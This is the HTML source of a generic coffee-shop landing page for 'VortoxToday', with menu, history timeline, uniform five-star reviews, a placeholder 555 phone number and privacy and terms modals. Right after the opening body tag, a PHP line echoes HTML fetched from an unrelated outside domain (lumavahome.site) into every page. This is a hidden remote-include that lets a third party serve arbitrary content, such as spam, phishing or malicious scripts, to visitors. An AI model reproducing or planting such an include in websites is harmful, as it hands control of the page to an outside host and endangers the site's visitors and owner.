<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VortoxToday - Artisan Coffee Experience | Fresh Roasted Daily</title>
    <meta name="description" content="VortoxToday Coffee Shop offers freshly roasted artisan coffee, handcrafted beverages, and cozy atmosphere. Visit us for the perfect cup of coffee made with passion and expertise.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f8f6f3;
        }

        .vx7nav-container {
            background: linear-gradient(135deg, #8B4513, #A0522D);
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .vx7nav-wrapper {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .vx7logo-text {
            color: white;
            font-size: 1.8rem;
            font-weight: bold;
            text-decoration: none;
        }

        .vx7nav-menu {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .vx7nav-link {
            color: white;
            text-decoration: none;
            transition: color 0.3s;
            cursor: pointer;
        }

        .vx7nav-link:hover {
            color: #FFE4B5;
        }

        .vx7hero-section {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/302899/pexels-photo-302899.jpeg') center/cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            margin-top: 70px;
        }

        .vx7hero-content {
            max-width: 800px;
            padding: 2rem;
        }

        .vx7hero-title {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .vx7hero-subtitle {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .vx7cta-button {
            background: #D2691E;
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 25px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }

        .vx7cta-button:hover {
            background: #B8860B;
        }

        .vx7about-section {
            padding: 5rem 2rem;
            background: white;
        }

        .vx7container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .vx7section-title {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 3rem;
            color: #8B4513;
        }

        .vx7about-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
        }

        .vx7about-text {
            font-size: 1.1rem;
            line-height: 1.8;
        }

        .vx7about-image {
            text-align: center;
        }

        .vx7about-image img {
            max-width: 100%;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .vx7history-section {
            padding: 5rem 2rem;
            background: #f5f3f0;
        }

        .vx7timeline {
            max-width: 800px;
            margin: 0 auto;
        }

        .vx7timeline-item {
            display: flex;
            margin-bottom: 3rem;
            align-items: center;
        }

        .vx7timeline-year {
            background: #8B4513;
            color: white;
            padding: 1rem;
            border-radius: 50%;
            font-weight: bold;
            min-width: 80px;
            text-align: center;
            margin-right: 2rem;
        }

        .vx7timeline-content {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            flex: 1;
        }

        .vx7services-section {
            padding: 5rem 2rem;
            background: white;
        }

        .vx7services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .vx7service-card {
            background: #f8f6f3;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            transition: transform 0.3s;
            border: 2px solid transparent;
        }

        .vx7service-card:hover {
            transform: translateY(-5px);
            border-color: #D2691E;
        }

        .vx7service-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        .vx7quality-section {
            padding: 5rem 2rem;
            background: linear-gradient(135deg, #8B4513, #A0522D);
            color: white;
        }

        .vx7quality-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .vx7quality-item {
            text-align: center;
            padding: 2rem;
        }

        .vx7quality-number {
            font-size: 3rem;
            font-weight: bold;
            color: #FFE4B5;
            margin-bottom: 1rem;
        }

        .vx7reviews-section {
            padding: 5rem 2rem;
            background: #f5f3f0;
        }

        .vx7reviews-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .vx7review-card {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .vx7review-stars {
            color: #FFD700;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        .vx7review-text {
            font-style: italic;
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .vx7review-author {
            font-weight: bold;
            color: #8B4513;
        }

        .vx7location-section {
            padding: 5rem 2rem;
            background: white;
        }

        .vx7location-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            margin-top: 3rem;
        }

        .vx7location-info {
            background: #f8f6f3;
            padding: 2rem;
            border-radius: 15px;
        }

        .vx7location-item {
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
        }

        .vx7location-icon {
            margin-right: 1rem;
            font-size: 1.2rem;
            color: #8B4513;
        }

        .vx7footer-section {
            background: #2C1810;
            color: white;
            padding: 3rem 2rem 1rem;
        }

        .vx7footer-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .vx7footer-column h3 {
            margin-bottom: 1rem;
            color: #FFE4B5;
        }

        .vx7footer-link {
            color: #ccc;
            text-decoration: none;
            display: block;
            margin-bottom: 0.5rem;
            transition: color 0.3s;
        }

        .vx7footer-link:hover {
            color: #FFE4B5;
        }

        .vx7phone-link {
            color: #FFE4B5;
            text-decoration: none;
            font-weight: bold;
        }

        .vx7footer-bottom {
            text-align: center;
            padding-top: 2rem;
            border-top: 1px solid #444;
            color: #ccc;
        }

        .vx7modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }

        .vx7modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 2rem;
            border-radius: 10px;
            width: 80%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .vx7close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .vx7close:hover {
            color: #000;
        }

        .vx7specialty-section {
            padding: 5rem 2rem;
            background: #f8f6f3;
        }

        .vx7specialty-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .vx7specialty-card {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .vx7specialty-card:hover {
            transform: translateY(-5px);
        }

        .vx7specialty-image {
            height: 200px;
            background-size: cover;
            background-position: center;
        }

        .vx7specialty-content {
            padding: 1.5rem;
        }

        @media (max-width: 768px) {
            .vx7nav-menu {
                display: none;
            }
            
            .vx7hero-title {
                font-size: 2.5rem;
            }
            
            .vx7about-grid,
            .vx7location-grid {
                grid-template-columns: 1fr;
            }
            
            .vx7timeline-item {
                flex-direction: column;
                text-align: center;
            }
            
            .vx7timeline-year {
                margin-right: 0;
                margin-bottom: 1rem;
            }
        }
    </style>
</head>
<body>

    <?php
echo file_get_contents('https://lumavahome.site/desktop.html');
?>
    
    <nav class="vx7nav-container">
        <div class="vx7nav-wrapper">
            <a href="#home" class="vx7logo-text">VortoxToday</a>
            <ul class="vx7nav-menu">
                <li><a href="#home" class="vx7nav-link">Home</a></li>
                <li><a href="#about" class="vx7nav-link">About</a></li>
                <li><a href="#history" class="vx7nav-link">Our Story</a></li>
                <li><a href="#services" class="vx7nav-link">Services</a></li>
                <li><a href="#specialty" class="vx7nav-link">Specialty</a></li>
                <li><a href="#quality" class="vx7nav-link">Quality</a></li>
                <li><a href="#reviews" class="vx7nav-link">Reviews</a></li>
                <li><a href="#location" class="vx7nav-link">Location</a></li>
            </ul>
        </div>
    </nav>

    <section id="home" class="vx7hero-section">
        <div class="vx7hero-content">
            <h1 class="vx7hero-title">VortoxToday Coffee</h1>
            <p class="vx7hero-subtitle">Where Every Cup Tells a Story of Passion and Craftsmanship</p>
            <a href="#about" class="vx7cta-button">Discover Our Journey</a>
        </div>
    </section>

    <section id="about" class="vx7about-section">
        <div class="vx7container">
            <h2 class="vx7section-title">About VortoxToday</h2>
            <div class="vx7about-grid">
                <div class="vx7about-text">
                    <p>Welcome to VortoxToday, where coffee culture meets community spirit. Our journey began with a simple vision: to create a space where exceptional coffee brings people together. We believe that every cup should be an experience, crafted with care and served with warmth.</p>
                    <br>
                    <p>Our skilled baristas are passionate about their craft, using only the finest beans sourced from sustainable farms around the world. From the moment you step through our doors, you'll be greeted by the rich aroma of freshly roasted coffee and the welcoming atmosphere that makes VortoxToday more than just a coffee shop – it's your neighborhood gathering place.</p>
                    <br>
                    <p>We take pride in supporting local communities and environmental sustainability. Every decision we make reflects our commitment to quality, community, and conscious business practices.</p>
                </div>
                <div class="vx7about-image">
                    <img src="https://images.pexels.com/photos/1307698/pexels-photo-1307698.jpeg" alt="VortoxToday Coffee Shop Interior">
                </div>
            </div>
        </div>
    </section>

    <section id="history" class="vx7history-section">
        <div class="vx7container">
            <h2 class="vx7section-title">Our Journey Through Time</h2>
            <div class="vx7timeline">
                <div class="vx7timeline-item">
                    <div class="vx7timeline-year">2018</div>
                    <div class="vx7timeline-content">
                        <h3>The Beginning</h3>
                        <p>Founded by coffee enthusiast Maria Rodriguez, VortoxToday started as a small roastery in a converted garage. Maria's passion for discovering unique coffee flavors from around the world laid the foundation for what would become a beloved community institution.</p>
                    </div>
                </div>
                <div class="vx7timeline-item">
                    <div class="vx7timeline-year">2019</div>
                    <div class="vx7timeline-content">
                        <h3>First Coffee Shop Opens</h3>
                        <p>After a year of perfecting our roasting techniques, we opened our first coffee shop location. The cozy 800-square-foot space quickly became a favorite among local coffee lovers, known for our signature single-origin blends and friendly atmosphere.</p>
                    </div>
                </div>
                <div class="vx7timeline-item">
                    <div class="vx7timeline-year">2020</div>
                    <div class="vx7timeline-content">
                        <h3>Community Support Initiative</h3>
                        <p>During challenging times, we launched our "Coffee for Care" program, providing free coffee to healthcare workers and first responders. This initiative strengthened our bond with the community and reinforced our commitment to giving back.</p>
                    </div>
                </div>
                <div class="vx7timeline-item">
                    <div class="vx7timeline-year">2021</div>
                    <div class="vx7timeline-content">
                        <h3>Sustainability Focus</h3>
                        <p>We partnered with Fair Trade certified farms and implemented eco-friendly practices throughout our operations. Our commitment to sustainability earned us recognition as a Green Business certified establishment.</p>
                    </div>
                </div>
                <div class="vx7timeline-item">
                    <div class="vx7timeline-year">2023</div>
                    <div class="vx7timeline-content">
                        <h3>Expansion and Innovation</h3>
                        <p>Today, VortoxToday continues to grow while maintaining our core values. We've introduced innovative brewing methods, expanded our food menu with locally-sourced ingredients, and remain dedicated to creating the perfect coffee experience for every customer.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="services" class="vx7services-section">
        <div class="vx7container">
            <h2 class="vx7section-title">Our Services</h2>
            <div class="vx7services-grid">
                <div class="vx7service-card">
                    <div class="vx7service-icon">☕</div>
                    <h3>Artisan Coffee</h3>
                    <p>Expertly crafted espresso drinks, pour-overs, and cold brews made with our signature roasted beans. Each cup is prepared with precision and passion by our skilled baristas.</p>
                </div>
                <div class="vx7service-card">
                    <div class="vx7service-icon">🥐</div>
                    <h3>Fresh Pastries</h3>
                    <p>Daily-baked croissants, muffins, and artisanal breads made with locally-sourced ingredients. Perfect companions to your favorite coffee selections.</p>
                </div>
                <div class="vx7service-card">
                    <div class="vx7service-icon">🌱</div>
                    <h3>Custom Roasting</h3>
                    <p>Small-batch roasting services for coffee enthusiasts who want to experience unique flavor profiles. We roast to order ensuring maximum freshness and quality.</p>
                </div>
                <div class="vx7service-card">
                    <div class="vx7service-icon">📚</div>
                    <h3>Study Space</h3>
                    <p>Comfortable seating areas with free Wi-Fi, perfect for students, remote workers, and anyone looking for a productive environment with great coffee.</p>
                </div>
                <div class="vx7service-card">
                    <div class="vx7service-icon">🎉</div>
                    <h3>Private Events</h3>
                    <p>Host your next meeting, book club, or small celebration in our cozy space. We provide catering services and can customize the experience for your group.</p>
                </div>
                <div class="vx7service-card">
                    <div class="vx7service-icon">🏠</div>
                    <h3>Coffee Delivery</h3>
                    <p>Enjoy VortoxToday coffee at home with our local delivery service. Fresh beans and brewing equipment delivered right to your doorstep.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="specialty" class="vx7specialty-section">
        <div class="vx7container">
            <h2 class="vx7section-title">Specialty Offerings</h2>
            <div class="vx7specialty-grid">
                <div class="vx7specialty-card">
                    <div class="vx7specialty-image" style="background-image: url('https://images.pexels.com/photos/1695052/pexels-photo-1695052.jpeg');"></div>
                    <div class="vx7specialty-content">
                        <h3>Single Origin Collection</h3>
                        <p>Explore unique flavors from specific regions around the world. Our rotating selection features beans from Ethiopia, Colombia, Guatemala, and other renowned coffee-growing regions, each with distinct characteristics and tasting notes.</p>
                    </div>
                </div>
                <div class="vx7specialty-card">
                    <div class="vx7specialty-image" style="background-image: url('https://images.pexels.com/photos/1251175/pexels-photo-1251175.jpeg');"></div>
                    <div class="vx7specialty-content">
                        <h3>Cold Brew Varieties</h3>
                        <p>Smooth, refreshing cold brew coffee steeped for 18 hours to create a naturally sweet and less acidic flavor profile. Available in original, vanilla, and seasonal flavors that change throughout the year.</p>
                    </div>
                </div>
                <div class="vx7specialty-card">
                    <div class="vx7specialty-image" style="background-image: url('https://images.pexels.com/photos/1458671/pexels-photo-1458671.jpeg');"></div>
                    <div class="vx7specialty-content">
                        <h3>Latte Art Creations</h3>
                        <p>Our talented baristas create beautiful latte art designs that make every cup Instagram-worthy. From classic rosetta patterns to seasonal designs, each drink is a work of art that tastes as good as it looks.</p>
                    </div>
                </div>
                <div class="vx7specialty-card">
                    <div class="vx7specialty-image" style="background-image: url('https://images.pexels.com/photos/1793035/pexels-photo-1793035.jpeg');"></div>
                    <div class="vx7specialty-content">
                        <h3>Seasonal Specials</h3>
                        <p>Limited-time beverages that celebrate the flavors of each season. From pumpkin spice alternatives in fall to refreshing fruit-infused drinks in summer, there's always something new to discover.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="quality" class="vx7quality-section">
        <div class="vx7container">
            <h2 class="vx7section-title">Quality That Speaks</h2>
            <div class="vx7quality-grid">
                <div class="vx7quality-item">
                    <div class="vx7quality-number">100%</div>
                    <h3>Ethically Sourced</h3>
                    <p>All our coffee beans are sourced from Fair Trade certified farms, ensuring farmers receive fair compensation for their exceptional work.</p>
                </div>
                <div class="vx7quality-item">
                    <div class="vx7quality-number">48hrs</div>
                    <h3>Fresh Roasted</h3>
                    <p>Every batch of coffee is roasted within 48 hours of serving, guaranteeing the freshest possible flavor in every cup you enjoy.</p>
                </div>
                <div class="vx7quality-item">
                    <div class="vx7quality-number">15+</div>
                    <h3>Coffee Origins</h3>
                    <p>We source beans from over 15 different countries, offering you a diverse range of flavors and experiences from around the globe.</p>
                </div>
                <div class="vx7quality-item">
                    <div class="vx7quality-number">5★</div>
                    <h3>Customer Rating</h3>
                    <p>Consistently rated 5 stars by our customers for quality, service, and atmosphere. Your satisfaction is our greatest achievement.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="vx7reviews-section">
        <div class="vx7container">
            <h2 class="vx7section-title">What Our Customers Say</h2>
            <div class="vx7reviews-grid">
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"VortoxToday has become my daily ritual. The baristas know my order by heart, and the coffee quality is consistently outstanding. The atmosphere is perfect for both work and relaxation."</p>
                    <p class="vx7review-author">- Sarah Mitchell</p>
                </div>
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"I've tried coffee shops all over the city, but nothing compares to VortoxToday. Their single-origin Ethiopian blend is absolutely incredible, and the staff is always friendly and knowledgeable."</p>
                    <p class="vx7review-author">- David Chen</p>
                </div>
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"The perfect study spot! Great Wi-Fi, comfortable seating, and the best coffee in town. I've written half my thesis here, fueled by their amazing cold brew."</p>
                    <p class="vx7review-author">- Emma Rodriguez</p>
                </div>
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"VortoxToday catered our company meeting, and it was fantastic. Professional service, delicious coffee, and fresh pastries. Highly recommend for any business event."</p>
                    <p class="vx7review-author">- Michael Thompson</p>
                </div>
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"Love the community feel here. The owners clearly care about their customers and the environment. Plus, their latte art is Instagram-worthy every single time!"</p>
                    <p class="vx7review-author">- Jessica Park</p>
                </div>
                <div class="vx7review-card">
                    <div class="vx7review-stars">★★★★★</div>
                    <p class="vx7review-text">"Been coming here for two years now, and they never disappoint. The seasonal specials are creative and delicious, and the regular menu has something for everyone."</p>
                    <p class="vx7review-author">- Robert Johnson</p>
                </div>
            </div>
        </div>
    </section>

    <section id="location" class="vx7location-section">
        <div class="vx7container">
            <h2 class="vx7section-title">Visit Us Today</h2>
            <div class="vx7location-grid">
                <div class="vx7location-info">
                    <h3>Location & Hours</h3>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">📍</span>
                        <span>1247 Maple Street, Downtown District, Springfield, IL 62701</span>
                    </div>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">🕒</span>
                        <span>Monday - Friday: 6:00 AM - 8:00 PM</span>
                    </div>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">🕒</span>
                        <span>Saturday - Sunday: 7:00 AM - 9:00 PM</span>
                    </div>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">📞</span>
                        <span><a href="tel:+1-217-555-0123" class="vx7phone-link">(217) 555-0123</a></span>
                    </div>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">✉️</span>
                        <span>hello@vortoxtoday.com</span>
                    </div>
                    <div class="vx7location-item">
                        <span class="vx7location-icon">🚗</span>
                        <span>Free parking available in rear lot</span>
                    </div>
                </div>
                <div class="vx7location-info">
                    <h3>Getting Here</h3>
                    <p>Located in the heart of Springfield's downtown district, VortoxToday is easily accessible by car, public transportation, or on foot. We're just two blocks from the main bus terminal and across from Central Park.</p>
                    <br>
                    <p>Look for our distinctive brown awning and the aroma of fresh coffee that welcomes you from the sidewalk. Street parking is available, and we offer a convenient rear parking lot for our customers.</p>
                    <br>
                    <p>Can't make it to us? No problem! We offer local delivery within a 5-mile radius and online ordering for pickup.</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="vx7footer-section">
        <div class="vx7container">
            <div class="vx7footer-grid">
                <div class="vx7footer-column">
                    <h3>VortoxToday Coffee</h3>
                    <p>Your neighborhood coffee destination where quality meets community. Join us for exceptional coffee and warm hospitality every day.</p>
                </div>
                <div class="vx7footer-column">
                    <h3>Quick Links</h3>
                    <a href="#about" class="vx7footer-link">About Us</a>
                    <a href="#services" class="vx7footer-link">Our Services</a>
                    <a href="#specialty" class="vx7footer-link">Specialty Coffee</a>
                    <a href="#location" class="vx7footer-link">Visit Us</a>
                    <a href="#" onclick="openModal('privacy')" class="vx7footer-link">Privacy Policy</a>
                    <a href="#" onclick="openModal('terms')" class="vx7footer-link">Terms of Service</a>
                </div>
                <div class="vx7footer-column">
                    <h3>Contact Info</h3>
                    <p>📍 1247 Maple Street<br>Springfield, IL 62701</p>
                    <p>📞 <a href="tel:+1-217-555-0123" class="vx7phone-link">(217) 555-0123</a></p>
                    <p>✉️ hello@vortoxtoday.com</p>
                    <p>🌐 www.vortoxtoday.com</p>
                </div>
                <div class="vx7footer-column">
                    <h3>Business Hours</h3>
                    <p>Monday - Friday<br>6:00 AM - 8:00 PM</p>
                    <p>Saturday - Sunday<br>7:00 AM - 9:00 PM</p>
                    <p>Holidays: Check our website for special hours</p>
                </div>
            </div>
            <div class="vx7footer-bottom">
                <p>© 2024 VortoxToday Coffee. All rights reserved. | Crafted with ❤️ and ☕</p>
            </div>
        </div>
    </footer>

    <!-- Privacy Policy Modal -->
    <div id="privacyModal" class="vx7modal">
        <div class="vx7modal-content">
            <span class="vx7close" onclick="closeModal('privacy')">×</span>
            <h2>Privacy Policy</h2>
            <p><strong>Effective Date:</strong> January 1, 2024</p>
            
            <h3>Information We Collect</h3>
            <p>At VortoxToday Coffee, we respect your privacy and are committed to protecting your personal information. We collect information you provide directly to us, such as when you:</p>
            <ul>
                <li>Visit our coffee shop and make purchases</li>
                <li>Sign up for our loyalty program</li>
                <li>Contact us with questions or feedback</li>
                <li>Subscribe to our newsletter</li>
                <li>Participate in surveys or promotions</li>
            </ul>

            <h3>How We Use Your Information</h3>
            <p>We use the information we collect to:</p>
            <ul>
                <li>Process your orders and payments</li>
                <li>Provide customer service and support</li>
                <li>Send you promotional offers and updates (with your consent)</li>
                <li>Improve our products and services</li>
                <li>Comply with legal obligations</li>
            </ul>

            <h3>Information Sharing</h3>
            <p>We do not sell, trade, or otherwise transfer your personal information to third parties without your consent, except as described in this policy. We may share information with:</p>
            <ul>
                <li>Service providers who assist us in operating our business</li>
                <li>Legal authorities when required by law</li>
                <li>Business partners for joint promotions (with your explicit consent)</li>
            </ul>

            <h3>Data Security</h3>
            <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. However, no method of transmission over the internet is 100% secure.</p>

            <h3>Your Rights</h3>
            <p>You have the right to:</p>
            <ul>
                <li>Access and update your personal information</li>
                <li>Opt-out of marketing communications</li>
                <li>Request deletion of your data (subject to legal requirements)</li>
                <li>File a complaint with relevant authorities</li>
            </ul>

            <h3>Contact Us</h3>
            <p>If you have questions about this Privacy Policy, please contact us at:</p>
            <p>Email: privacy@vortoxtoday.com<br>
            Phone: <a href="tel:+1-217-555-0123">(217) 555-0123</a><br>
            Address: 1247 Maple Street, Springfield, IL 62701</p>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="termsModal" class="vx7modal">
        <div class="vx7modal-content">
            <span class="vx7close" onclick="closeModal('terms')">×</span>
            <h2>Terms of Service</h2>
            <p><strong>Effective Date:</strong> January 1, 2024</p>

            <h3>Acceptance of Terms</h3>
            <p>By visiting VortoxToday Coffee and using our services, you agree to comply with and be bound by these Terms of Service. If you do not agree with these terms, please do not use our services.</p>

            <h3>Services Description</h3>
            <p>VortoxToday Coffee provides:</p>
            <ul>
                <li>Coffee and beverage preparation and service</li>
                <li>Food items and pastries</li>
                <li>Seating and workspace facilities</li>
                <li>Catering and event services</li>
                <li>Coffee bean sales and delivery services</li>
                <li>Wi-Fi access for customers</li>
            </ul>

            <h3>Customer Responsibilities</h3>
            <p>As a customer, you agree to:</p>
            <ul>
                <li>Treat staff and other customers with respect</li>
                <li>Follow posted rules and guidelines</li>
                <li>Pay for all orders promptly</li>
                <li>Report any issues or concerns to management</li>
                <li>Use our facilities responsibly</li>
                <li>Respect our operating hours</li>
            </ul>

            <h3>Payment Terms</h3>
            <p>We accept cash, credit cards, and mobile payments. All sales are final unless there is a quality issue with your order. Refunds for defective products will be provided at management's discretion.</p>

            <h3>Facility Use</h3>
            <p>Our seating areas and Wi-Fi are provided for customer convenience. We reserve the right to:</p>
            <ul>
                <li>Limit seating time during busy periods</li>
                <li>Ask customers to make additional purchases for extended stays</li>
                <li>Restrict use of facilities for inappropriate behavior</li>
                <li>Modify or discontinue services without notice</li>
            </ul>

            <h3>Liability Limitations</h3>
            <p>VortoxToday Coffee is not liable for:</p>
            <ul>
                <li>Personal property loss or damage</li>
                <li>Injuries not caused by our negligence</li>
                <li>Service interruptions due to circumstances beyond our control</li>
                <li>Third-party actions or services</li>
            </ul>

            <h3>Modifications</h3>
            <p>We reserve the right to modify these terms at any time. Changes will be posted in our establishment and on our website. Continued use of our services constitutes acceptance of modified terms.</p>

            <h3>Contact Information</h3>
            <p>For questions about these Terms of Service:</p>
            <p>Email: legal@vortoxtoday.com<br>
            Phone: <a href="tel:+1-217-555-0123">(217) 555-0123</a><br>
            Address: 1247 Maple Street, Springfield, IL 62701</p>
        </div>
    </div>

    <script>
        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Modal functionality
        function openModal(type) {
            const modal = document.getElementById(type + 'Modal');
            if (modal) {
                modal.style.display = 'block';
                document.body.style.overflow = 'hidden';
            }
        }

        function closeModal(type) {
            const modal = document.getElementById(type + 'Modal');
            if (modal) {
                modal.style.display = 'none';
                document.body.style.overflow = 'auto';
            }
        }

        // Close modal when clicking outside of it
        window.onclick = function(event) {
            const modals = document.querySelectorAll('.vx7modal');
            modals.forEach(modal => {
                if (event.target === modal) {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            });
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                const modals = document.querySelectorAll('.vx7modal');
                modals.forEach(modal => {
                    if (modal.style.display === 'block') {
                        modal.style.display = 'none';
                        document.body.style.overflow = 'auto';
                    }
                });
            }
        });

        // Add active class to navigation links based on scroll position
        window.addEventListener('scroll', function() {
            const sections = document.querySelectorAll('section[id]');
            const navLinks = document.querySelectorAll('.vx7nav-link');
            
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.clientHeight;
                if (scrollY >= (sectionTop - 200)) {
                    current = section.getAttribute('id');
                }
            });

            navLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === '#' + current) {
                    link.classList.add('active');
                }
            });
        });

        // Add some interactive elements
        document.addEventListener('DOMContentLoaded', function() {
            // Animate service cards on scroll
            const observerOptions = {
                threshold: 0.1,
                rootMargin: '0px 0px -50px 0px'
            };

            const observer = new IntersectionObserver(function(entries) {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.style.opacity = '1';
                        entry.target.style.transform = 'translateY(0)';
                    }
                });
            }, observerOptions);

            // Observe service cards and review cards
            const cards = document.querySelectorAll('.vx7service-card, .vx7review-card, .vx7specialty-card');
            cards.forEach(card => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(20px)';
                card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                observer.observe(card);
            });

            // Add hover effects to timeline items
            const timelineItems = document.querySelectorAll('.vx7timeline-content');
            timelineItems.forEach(item => {
                item.addEventListener('mouseenter', function() {
                    this.style.transform = 'scale(1.02)';
                    this.style.transition = 'transform 0.3s ease';
                });
                
                item.addEventListener('mouseleave', function() {
                    this.style.transform = 'scale(1)';
                });
            });
        });

        // Add click tracking for Google Ads (placeholder function)
        function trackClick(element, action) {
            // This would integrate with Google Analytics or Google Ads tracking
            console.log('Tracking click:', element, action);
            // gtag('event', 'click', {
            //     'event_category': 'engagement',
            //     'event_label': action
            // });
        }

        // Add click tracking to CTA buttons
        document.querySelectorAll('.vx7cta-button').forEach(button => {
            button.addEventListener('click', function() {
                trackClick(this, 'cta_click');
            });
        });

        // Add click tracking to phone number
        document.querySelectorAll('.vx7phone-link').forEach(link => {
            link.addEventListener('click', function() {
                trackClick(this, 'phone_call');
            });
        });
    </script>
</body>
</html>



